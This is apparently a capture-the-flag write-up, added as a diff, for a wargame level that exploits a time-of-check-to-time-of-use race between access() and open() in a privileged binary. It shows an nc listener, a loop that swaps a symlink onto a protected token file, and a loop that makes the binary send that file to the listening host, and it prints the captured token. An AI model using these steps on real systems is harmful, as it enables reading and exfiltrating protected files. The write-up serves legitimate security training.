@@ -1,0 +1,24 @@
+Inspecting the binary, we see that the host to receive the file should listen to port 6969
+On a terminal of a host, we run 'nc -lk 6969' and we wait for some incoming information.
+(-l : Listen for an incoming connection rather than initiating a con‐
+             nection to a remote host.
+-k : When a connection is completed, listen for another one.  Requires
+             -l.)
+
+
+The binary checks if we have proper right to the file with access() and then open() the file.
+
+A race condition exploit takes advantage of the timing issues (in this exercize, the timing between the access() and the open() call) to manipulate the intended behavior of a program and gain unauthorized access or privilegesi.
+-> Time of Check to Time of Use (TOCTTOU)
+
+To exploit this in-between timing, we can create a symbolic link which changes its state constantly, pointing to two different files : 1) a file that we have permission to read and write 2) the 'token' file that is out interest but to which we don't have permission. 
+
+For this, we run this script in an infinite loop on the server side:
+while true; do ln -fs ~/level10 /tmp/exploit; ln -fs ~/token /tmp/exploit; done
+
+And then we run the binary with the state-changing symlink file in another infinite loop so that we could manipulate the race condition:
+while true; do ./level10 /tmp/exploit [host that is listening with nc]; done
+
+On the listening host's terminal, we continuously receive the mix of the contents of the dummy file and the token!
+
+and the token is: woupa2yuojeeaaed06riuj63c
